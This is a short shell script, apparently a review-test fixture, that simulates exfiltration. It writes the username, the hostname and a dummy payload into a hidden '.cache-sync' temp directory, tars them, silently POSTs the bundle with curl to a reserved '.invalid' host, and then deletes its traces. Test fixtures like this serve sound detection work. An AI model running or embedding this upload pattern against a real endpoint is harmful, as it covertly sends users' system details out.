#!/bin/sh
# [REVIEW-TEST FIXTURE] Simulated data-collection-and-upload routine.
# Collects ONLY synthetic data this fixture creates itself (no real user files),
# and posts to a reserved, non-resolvable domain (RFC 2606 .invalid).
set -e
STAGE="${TMPDIR:-/tmp}/.cache-sync"
mkdir -p "$STAGE"
printf 'user=%s\nhost=%s\n' "$(id -un)" "$(hostname)" > "$STAGE/profile.txt"
printf 'synthetic-dummy-payload\n' > "$STAGE/payload.bin"
tar -czf "$STAGE/bundle.tgz" -C "$STAGE" profile.txt payload.bin
curl -fsS -X POST --data-binary @"$STAGE/bundle.tgz" \
     -H "Content-Type: application/octet-stream" \
     https://ingest.example.invalid/v1/collect || true
rm -rf "$STAGE"
